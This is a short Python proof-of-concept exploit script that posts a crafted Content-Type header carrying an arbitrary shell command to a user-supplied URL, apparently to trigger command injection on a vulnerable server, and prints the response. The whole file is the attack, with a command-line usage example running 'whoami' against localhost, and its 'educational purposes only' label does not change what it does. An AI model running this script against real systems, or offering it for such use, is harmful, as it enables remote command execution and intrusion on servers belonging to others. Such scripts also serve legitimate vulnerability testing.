import requests
import sys

def demonstrate_exploit(url, command):
    """
    Demonstrates the vulnerability by sending a malicious Content-Type header.
    For educational purposes only.
    """
    print("[*] Educational Demo - Do not use on real systems!")
    print(f"[*] Targeting URL: {url}")
    
    headers = {
        'Content-Type': f'command={command}'
    }
    
    try:
        response = requests.post(url, headers=headers)
        print("\n[+] Response:")
        print(response.json())
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python demo_exploit.py <url> <command>")
        print("Example: python demo_exploit.py http://localhost:5000/api/data whoami")
        sys.exit(1)
    
    url = sys.argv[1]
    command = sys.argv[2]
    demonstrate_exploit(url, command)
